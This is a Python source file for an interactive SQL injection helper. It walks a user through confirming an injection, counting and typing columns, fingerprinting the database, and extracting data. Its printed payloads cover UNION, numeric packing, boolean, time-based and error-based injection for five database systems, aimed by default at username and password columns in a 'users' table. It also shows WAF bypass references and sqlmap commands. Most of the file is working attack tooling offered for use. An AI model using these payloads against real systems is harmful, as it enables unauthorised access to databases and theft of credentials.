#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Interactive walkthrough for SQL injection methodology.

Order follows classic methodology:
    1. Confirm injection + determine context
    2. Count columns      (universal: ORDER BY / UNION SELECT NULL)
    3. Determine types    (universal: 'a' vs NULL)
    4. Fingerprint DBMS   (now that UNION works)
    5. Extract data       (UNION / numeric pack / blind, with backtracking)
"""

import sys
from typing import Optional

from cheatsheet import (
    FINGERPRINT, SESSION_INFO, COMMENT_SYNTAX, CONCAT_SYNTAX,
    SUBSTR_SYNTAX, LENGTH_SYNTAX, SLEEP_SYNTAX, HEAVY_QUERY,
    TABLES_QUERY, COLUMNS_QUERY, INFO_SCHEMA_ALTERNATIVES,
    ERROR_BASED, WAF_BYPASS, STRING_REPR, MYSQL_TRICKS,
    SQLMAP_CMDS,
)
from union_builder import UnionBuilder
from pack_builder import NumType, sql_pack_expr


LINE_WIDTH = 68


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def hr(c: str = "-", n: int = LINE_WIDTH) -> None:
    print(c * n)


def title(t: str) -> None:
    hr("=")
    print(f"  {t}")
    hr("=")


def sec(t: str) -> None:
    print()
    hr()
    print(f"  {t}")
    hr()


def hint(t: str) -> None:
    print(f"  hint : {t}")


def pay(t: str) -> None:
    print(f"  -->  {t}")


def note(t: str) -> None:
    print(f"  * {t}")


def ask(prompt: str, options: dict) -> str:
    """Asks the user to pick an option.

    options: dict {key: (label, next_key)}
    Returns the next_key of the chosen option.
    """
    for k, (label, _) in options.items():
        print(f"    [{k}] {label}")
    while True:
        ans = input(f"  {prompt}: ").strip()
        if ans in options:
            return options[ans][1]
        print("  ! invalid choice.")


def ask_int(prompt: str, lo: int = 1, hi: int = 30) -> int:
    while True:
        try:
            n = int(input(f"  {prompt} [{lo}-{hi}]: ").strip())
            if lo <= n <= hi:
                return n
        except ValueError:
            pass
        print(f"  ! enter a number {lo}-{hi}.")


def pick_db() -> str:
    return ask("Which DBMS?", {
        "1": ("MySQL / MariaDB", "mysql"),
        "2": ("MSSQL",           "mssql"),
        "3": ("PostgreSQL",      "postgres"),
        "4": ("Oracle",          "oracle"),
        "5": ("SQLite",          "sqlite"),
        "6": ("Unknown",         "unknown"),
    })


def db_to_title(db: str) -> str:
    return {"mysql": "MySQL", "mssql": "MSSQL", "postgres": "PostgreSQL",
            "oracle": "Oracle", "sqlite": "SQLite"}.get(db, "Unknown")


def show_map(name: str, mapping: dict) -> None:
    sec(name)
    w = max(len(str(k)) for k in mapping)
    for k, v in mapping.items():
        print(f"  {str(k):<{w}} : {v}")


def show_sleep(db: str) -> None:
    show_map("Sleep (time-based)",
             {"Payload": SLEEP_SYNTAX[db_to_title(db)]})
    show_map("Heavy query (if sleep is blocked)",
             {"Payload": HEAVY_QUERY[db_to_title(db)]})


def show_full_cheatsheet() -> None:
    title("Final cheatsheet")
    show_map("Fingerprint", FINGERPRINT)
    show_map("Session", SESSION_INFO)
    show_map("Comments", COMMENT_SYNTAX)
    show_map("Concatenation", CONCAT_SYNTAX)
    show_map("Substring", SUBSTR_SYNTAX)
    show_map("Length", LENGTH_SYNTAX)
    show_map("Sleep", SLEEP_SYNTAX)
    show_map("Tables query", TABLES_QUERY)
    show_map("Columns query", COLUMNS_QUERY)
    show_map("information_schema alternatives", INFO_SCHEMA_ALTERNATIVES)
    show_map("Error-based", ERROR_BASED)
    show_map("WAF bypass", WAF_BYPASS)
    show_map("Strings", STRING_REPR)
    print("\n== sqlmap ==")
    for name, cmd in SQLMAP_CMDS:
        print(f"  {name:<22} {cmd}")


def context_prefix(context: str) -> str:
    """Returns the SQL prefix for the given context."""
    if context == "numeric":
        return "1"
    if context == "like":
        return "%'"
    return "'"


def add_clause(payload: str, clause: str) -> str:
    """Inserts `clause` before the trailing SQL comment of `payload`.

    Handles payloads that end with or without '-- -'. Ensures a single
    space between the existing SQL and the inserted clause.
    """
    if "-- -" in payload:
        head, _ = payload.rsplit("-- -", 1)
        return f"{head.rstrip()} {clause}-- -"
    return f"{payload.rstrip()} {clause}"


# ---------------------------------------------------------------------------
# STEP 1. Confirm injection + determine context
# ---------------------------------------------------------------------------

def step_confirm_injection() -> tuple:
    """Returns (signal, context).

    signal:  ok_string | ok_numeric | ok_like | ok_time | ok_error | same | blocked
    context: string | numeric | like | unknown
    """
    sec("STEP 1. Confirm the injection and determine the context")
    hint("A) Break test - inject one character and look for a change:")
    pay("'          -> error / different page?  => STRING context")
    pay("1'         -> error?                   => NUMERIC context")
    pay("\\          -> error?                   => escaping active")
    pay('"          -> error?                   => double-quote context')
    print()
    hint("B) Try to complete the query with a comment:")
    pay("'-- -      -> success?  => STRING context, comment works")
    pay("1-- -      -> success?  => NUMERIC context")
    pay("%'-- -     -> success?  => LIKE context")
    print()
    hint("C) Confirm with a boolean pair in the SAME context:")
    pay("string:   ' AND '1'='1'-- -     vs    ' AND '1'='2'-- -")
    pay("numeric:  1 AND 1=1             vs    1 AND 1=2")
    pay("like:     %' AND '1'='1'-- -    vs    %' AND '1'='2'-- -")
    print()
    hint("D) If nothing differs, try time-based (use the right function):")
    pay("' AND SLEEP(5)-- -                              -- MySQL")
    pay("' AND pg_sleep(5)-- -                           -- PostgreSQL")
    pay("'; WAITFOR DELAY '0:0:5'-- -                    -- MSSQL")
    pay("' AND 1=dbms_pipe.receive_message(('a'),5)-- -  -- Oracle")
    pay("' AND 1=randomblob(100000000)-- -               -- SQLite")
    print()
    hint("E) If the comment fails, try alternatives:")
    pay("-- -    #    /*    ;%00")
    print()

    signal = ask("What signal did you get?", {
        "1": ("String context confirmed (quote breaks, comment fixes)", "ok_string"),
        "2": ("Numeric context confirmed (1 AND 1=1 works)",            "ok_numeric"),
        "3": ("LIKE context confirmed (%' ... works)",                  "ok_like"),
        "4": ("Stable delay after SLEEP",                               "ok_time"),
        "5": ("Error leaks DB info (version, table name)",              "ok_error"),
        "6": ("Nothing changes at all",                                 "same"),
        "7": ("Blocked (403 / WAF / connection reset)",                 "blocked"),
    })

    context = {
        "ok_string":  "string",
        "ok_numeric": "numeric",
        "ok_like":    "like",
    }.get(signal, "unknown")

    return signal, context


def step_waf() -> str:
    sec("WAF / filter")
    hint("Try bypasses. What can be varied:")
    show_map("WAF bypass", WAF_BYPASS)
    return ask("Did it help?", {
        "1": ("Yes, something worked", "proceed"),
        "2": ("No, still blocked",     "blocked"),
    })


# ---------------------------------------------------------------------------
# STEP 2. Count columns (universal, DBMS not needed)
# ---------------------------------------------------------------------------

def step_columns(context: str) -> int:
    sec("STEP 2. How many columns in the original SELECT?")
    hint("This is NOT about URL parameters. It's about the columns")
    hint("the page returns. Find N via ORDER BY / UNION SELECT NULL.")
    print()

    prefix = context_prefix(context)

    hint("A) ORDER BY N - increase until an error:")
    for n in (1, 2, 3, 4, 5, 6):
        pay(f"{prefix} ORDER BY {n}-- -")
    note("Stop at the first N that errors. N-1 is the column count.")
    print()
    hint("B) UNION SELECT NULL,... - increase NULLs until no error:")
    for n in (1, 2, 3, 4, 5):
        nulls = ",".join(["NULL"] * n)
        pay(f"{prefix} UNION SELECT {nulls}-- -")
    print()
    note("Use whichever method works. ORDER BY is faster, UNION is more reliable.")
    return ask_int("How many columns?", 1, 30)


# ---------------------------------------------------------------------------
# STEP 3. Determine column types (universal, DBMS not needed)
# ---------------------------------------------------------------------------

def step_types(n_cols: int, context: str) -> str:
    sec(f"STEP 3. Types of {n_cols} columns")
    hint("Replace NULL with 'a' one column at a time. No error -> string.")
    print()

    prefix = context_prefix(context)

    for i in range(n_cols):
        cols = ["NULL"] * n_cols
        cols[i] = "'a'"
        pay(f"{prefix} UNION SELECT " + ",".join(cols) + "-- -")
    print()
    note("If all error out -> all columns are numeric.")
    note("If all succeed -> all columns accept strings.")
    print()
    hint("Then re-test each string column with a number to distinguish:")
    for i in range(n_cols):
        cols = ["NULL"] * n_cols
        cols[i] = "1"
        pay(f"{prefix} UNION SELECT " + ",".join(cols) + "-- -")
    note("If a column errors on '1' -> it is a STRING column.")
    note("If a column errors on 'a' -> it is a NUMERIC column.")
    print()

    return ask("Result?", {
        "1": ("At least one string column exists", "string"),
        "2": ("All numeric",                       "numeric"),
        "3": ("Nothing is rendered on page",       "blind"),
    })


# ---------------------------------------------------------------------------
# STEP 4. Fingerprint DBMS (now that UNION works)
# ---------------------------------------------------------------------------

def step_fingerprint(n_cols: int, context: str) -> str:
    sec("STEP 4. Fingerprint the DBMS")
    hint("Now that UNION works, try version queries and watch the output.")
    print()

    prefix = context_prefix(context)

    hint("A) Version via UNION (put into a string column):")
    pay(f"{prefix} UNION SELECT @@version{',NULL' * (n_cols - 1)}-- -   -- MySQL / MSSQL")
    pay(f"{prefix} UNION SELECT version(){',NULL' * (n_cols - 1)}-- -   -- PostgreSQL")
    pay(f"{prefix} UNION SELECT banner FROM v$version WHERE ROWNUM=1"
        f"{',NULL' * (n_cols - 1)}-- -   -- Oracle")
    pay(f"{prefix} UNION SELECT sqlite_version(){',NULL' * (n_cols - 1)}-- - -- SQLite")
    print()
    hint("B) Error-based fingerprint (force a type error):")
    pay(f"{prefix} AND 1=CONVERT(int,'a')-- -      -- MSSQL")
    pay(f"{prefix} AND EXTRACTVALUE(1,'a')-- -     -- MySQL")
    pay(f"{prefix} AND 1=CAST('a' AS int)-- -      -- PostgreSQL")
    print()
    hint("C) String concatenation fingerprint:")
    pay(f"{prefix} UNION SELECT 'a'+'b'{',NULL' * (n_cols - 1)}-- -   -- MSSQL")
    pay(f"{prefix} UNION SELECT 'a'||'b'{',NULL' * (n_cols - 1)}-- -  -- PostgreSQL / Oracle / SQLite")
    print()
    hint("D) Comment syntax fingerprint:")
    pay(f"{prefix} UNION SELECT 1#                        -- MySQL only")
    pay(f"{prefix} UNION SELECT 1-- -                     -- all")
    print()
    show_map("Fingerprint reference", FINGERPRINT)
    return pick_db()


# ---------------------------------------------------------------------------
# STEP 5. Extraction strategies
# ---------------------------------------------------------------------------

def step_string(db: str, n_cols: int, context: str) -> Optional[str]:
    """UNION SELECT extraction with backtracking.

    Returns:
        None                                - normal end
        "columns" / "table"                 - handled internally, continue
        "col_count" / "col_type" / "dbms"   - jump back to that step
        "exit"                              - exit walkthrough
    """
    sec("Strategy A. UNION SELECT with a string column")

    prefix = context_prefix(context)

    s_col = ask_int("Which column (1-based) to output into?", 1, n_cols)
    note(f"Output column: {s_col}")

    show_map("Substring / ASCII",
             {"Payload": SUBSTR_SYNTAX[db_to_title(db)]})
    show_map("Length", {"Payload": LENGTH_SYNTAX[db_to_title(db)]})
    show_map("Concatenation", {"Payload": CONCAT_SYNTAX[db_to_title(db)]})
    print()

    tgt = "users"

    while True:
        hint("1) Table name (or press Enter to keep the current one):")
        t = input(f"  Table [{tgt}]: ").strip()
        if t:
            tgt = t
        note(f"Table: {tgt}")

        hint("2) Column names of the target table, comma-separated.")
        hint("   You can list as many as you want:")
        pay("username")
        pay("username,password")
        pay("username,password,created_at")
        pay("id,username,password,email,created_at")
        print()
        hint("   Use the column-listing payload first if unsure:")
        if db == "sqlite":
            pay(f"{prefix} UNION SELECT name{',NULL' * (n_cols - 1)} "
                f"FROM pragma_table_info('{tgt}')-- -")
        elif db == "oracle":
            pay(f"{prefix} UNION SELECT column_name{',NULL' * (n_cols - 1)} "
                f"FROM user_tab_columns WHERE table_name='{tgt.upper()}'-- -")
        else:
            pay(UnionBuilder(n_cols, [s_col], {s_col: ["column_name"]},
                             dialect=db, table="information_schema.columns",
                             where=f"table_name='{tgt}'").build())
        print()

        cols_csv = input("  Columns (comma-separated): ").strip()
        if not cols_csv:
            cols_csv = "username,password"
            note(f"No input - using default: {cols_csv}")

        layout_cols = [c.strip() for c in cols_csv.split(",") if c.strip()]
        if not layout_cols:
            print("  ! no column names parsed. Try again.")
            continue

        note(f"Columns: {', '.join(layout_cols)}")

        payload = UnionBuilder(n_cols, [s_col], {s_col: layout_cols},
                               dialect=db, table=tgt).build()

        print()
        print("  " + "=" * 64)
        print("  FINAL PAYLOAD - paste this into the URL:")
        print("  " + "=" * 64)
        print(f"  {payload}")
        print("  " + "=" * 64)
        print()
        note("URL-encode spaces as %20 or + if needed.")
        note(f"Result format: {':-:'.join(layout_cols)}")
        note("If only the first row is shown, add LIMIT 1 OFFSET N:")
        pay(add_clause(payload, "LIMIT 1 OFFSET 0"))
        pay(add_clause(payload, "LIMIT 1 OFFSET 1"))
        print()

        ans = ask("What next?", {
            "1": ("Got the data - show final cheatsheet",       "cheatsheet"),
            "2": ("Retry same table, different columns",        "columns"),
            "3": ("Try another table",                          "table"),
            "4": ("Back to STEP 4 (fingerprint DBMS)",          "dbms"),
            "5": ("Back to STEP 3 (column types)",              "col_type"),
            "6": ("Back to STEP 2 (column count)",              "col_count"),
            "7": ("Exit",                                       "exit"),
        })

        if ans == "cheatsheet":
            return None
        if ans == "columns":
            continue
        if ans == "table":
            tgt = "users"
            continue
        if ans == "dbms":
            return "dbms"
        if ans == "col_type":
            return "col_type"
        if ans == "col_count":
            return "col_count"
        if ans == "exit":
            return "exit"


def step_numeric(db: str, n_cols: int, context: str) -> None:
    sec("Strategy B. Numeric only -> pack ASCII into INT / BIGINT")
    hint("1 char = 1 request:")
    pay("' UNION SELECT ASCII(SUBSTRING((SELECT table_name "
        "FROM information_schema.tables WHERE table_schema=database() "
        "ORDER BY table_name LIMIT 1),1,1)),NULL-- -")
    print()
    hint("N chars at once - pack into a single number.")
    tname = ask("Column type?", {
        "1": ("byte",  "byte"),
        "2": ("short", "short"),
        "3": ("int",   "int"),
        "4": ("long",  "long"),
        "5": ("unknown (assume int)", "int"),
    })
    t = NumType(tname)
    n7 = t.max_chars_7bit
    n8 = t.max_chars_8bit
    note(f"{tname}: {t.bytes} bytes, {n8} chars at 8 bits, {n7} at 7 bits (signed-safe)")
    src = ("(SELECT table_name FROM information_schema.tables "
           "WHERE table_schema=database() ORDER BY table_name LIMIT 1)")
    pay(f"1 UNION SELECT {sql_pack_expr(src, 1, n7, bits=7, dialect='mysql')}-- -")
    print()
    hint("Unpack on the Python side:")
    pay("from pack_builder import unpack_ascii_7bit")
    pay(f"print(unpack_ascii_7bit(n, {n7}))")


def step_blind(db: str, n_cols: int, context: str) -> str:
    sec("Strategy C. Blind")
    return ask("Which type of blind?", {
        "1": ("Boolean (yes/no)",   "boolean"),
        "2": ("Time-based (delay)", "time"),
    })


def step_blind_boolean(db: str, context: str) -> None:
    sec("Blind: boolean")
    hint("Length:")
    pay("' AND LENGTH((SELECT table_name FROM information_schema.tables "
        "WHERE table_schema=database() ORDER BY table_name LIMIT 1))=5-- -")
    hint("Char:")
    pay("' AND ASCII(SUBSTRING((SELECT table_name "
        "FROM information_schema.tables WHERE table_schema=database() "
        "ORDER BY table_name LIMIT 1),1,1))>100-- -")
    note("Binary search: about 7 requests per character (0-127).")


def step_blind_time(db: str, context: str) -> None:
    sec(f"Blind: time-based ({db_to_title(db)})")
    cond = ("ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database() ORDER BY table_name LIMIT 1),1,1)) > 100")
    if db == "mysql":
        pay(f"' AND IF({cond}, SLEEP(5), 0)-- -")
    elif db == "postgres":
        pay(f"'; SELECT CASE WHEN ({cond}) THEN pg_sleep(5) END-- -")
    elif db == "mssql":
        pay(f"'; IF ({cond}) WAITFOR DELAY '0:0:5'-- -")
    elif db == "oracle":
        pay(f"' AND 1=(SELECT 1 FROM dual WHERE ({cond}) "
            f"AND dbms_pipe.receive_message(('a'),5)=1)-- -")
    else:
        pay(f"' AND 1=(SELECT 1 FROM (SELECT 1) WHERE ({cond}) "
            "AND 1=randomblob(100000000))-- -")
    note("Use 5 seconds, not 1 - fewer false positives.")
    show_sleep(db)


# ---------------------------------------------------------------------------
# Main flow
# ---------------------------------------------------------------------------

def run() -> None:
    title("SQLi Helper")
    print("  Methodology: inject -> context -> columns -> types -> DBMS -> extract.\n")
    print("  Answer by keys; the helper suggests the next step.\n")

    signal, context = step_confirm_injection()

    while signal in ("same", "blocked"):
        if signal == "same":
            sec("Response does not differ")
            hint("Try time-based or check the context:")
            pay("' AND SLEEP(5)-- -")
            pay("1) AND SLEEP(5)-- -")
            pay("') AND SLEEP(5)-- -")
            r2 = ask("Now?", {
                "1": ("Delay / difference appears", "ok_string"),
                "2": ("Still nothing",              "blocked"),
            })
            if r2 == "ok_string":
                signal = "ok_string"
                context = "string"
                break
        if signal == "blocked":
            r = step_waf()
            if r == "proceed":
                signal = "ok_string"
                context = "string"
                break
            break

    if signal == "blocked":
        sec("Bypass reference")
        show_map("WAF bypass", WAF_BYPASS)
        show_map("Strings", STRING_REPR)
        show_map("MySQL tricks", MYSQL_TRICKS)
        print("\n  Stopping. Proceed manually.")
        return

    if signal == "ok_time":
        sec("Time-based path")
        show_map("Sleep functions", SLEEP_SYNTAX)
        db = pick_db()
        if db == "unknown":
            db = "mysql"
        step_blind_time(db, context)
        print()
        ans = ask("Show full cheatsheet?", {
            "1": ("Yes, show reference tables", "yes"),
            "2": ("No, I'm done",               "no"),
        })
        if ans == "yes":
            show_full_cheatsheet()
        hr("=")
        print("  Done.")
        hr("=")
        return

    if signal == "ok_error":
        sec("Error-based path")
        show_map("Error-based", ERROR_BASED)
        db = pick_db()
        if db == "unknown":
            db = "mysql"
        note(f"DBMS: {db_to_title(db)}")
        print()
        hint("Extract data via error messages:")
        pay("' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name "
            "FROM information_schema.tables LIMIT 1)))-- -")
        print()
        ans = ask("Show full cheatsheet?", {
            "1": ("Yes, show reference tables", "yes"),
            "2": ("No, I'm done",               "no"),
        })
        if ans == "yes":
            show_full_cheatsheet()
        hr("=")
        print("  Done.")
        hr("=")
        return

    note(f"Context: {context}")

    n_cols = None
    kind = None
    db = None
    next_step = None

    while True:
        if next_step in (None, "columns"):
            n_cols = step_columns(context)
            note(f"Columns: {n_cols}")
            next_step = None

        if next_step in (None, "types"):
            kind = step_types(n_cols, context)
            next_step = None

        if next_step in (None, "dbms"):
            db = step_fingerprint(n_cols, context)
            if db == "unknown":
                sec("Unknown DBMS")
                hint("Identify the DBMS first. Things to try:")
                show_map("Fingerprint", FINGERPRINT)
                show_map("Session", SESSION_INFO)
                db = pick_db()
                if db == "unknown":
                    print("  Falling back to mysql.")
                    db = "mysql"
            note(f"DBMS: {db_to_title(db)}")
            next_step = None

        if kind == "string":
            result = step_string(db, n_cols, context)
            if result in ("columns", "table"):
                continue
            if result == "col_count":
                next_step = "columns"
                continue
            if result == "col_type":
                next_step = "types"
                continue
            if result == "dbms":
                next_step = "dbms"
                continue
            if result == "exit":
                break
            break

        elif kind == "numeric":
            step_numeric(db, n_cols, context)
            break

        else:
            bt = step_blind(db, n_cols, context)
            if bt == "boolean":
                step_blind_boolean(db, context)
            else:
                step_blind_time(db, context)
            break

    print()
    ans = ask("Show full cheatsheet?", {
        "1": ("Yes, show reference tables", "yes"),
        "2": ("No, I'm done",               "no"),
    })
    if ans == "yes":
        show_full_cheatsheet()

    hr("=")
    print("  Done.")
    hr("=")


def main() -> None:
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        print("\n  Interrupted.")
        sys.exit(0)


if __name__ == "__main__":
    main()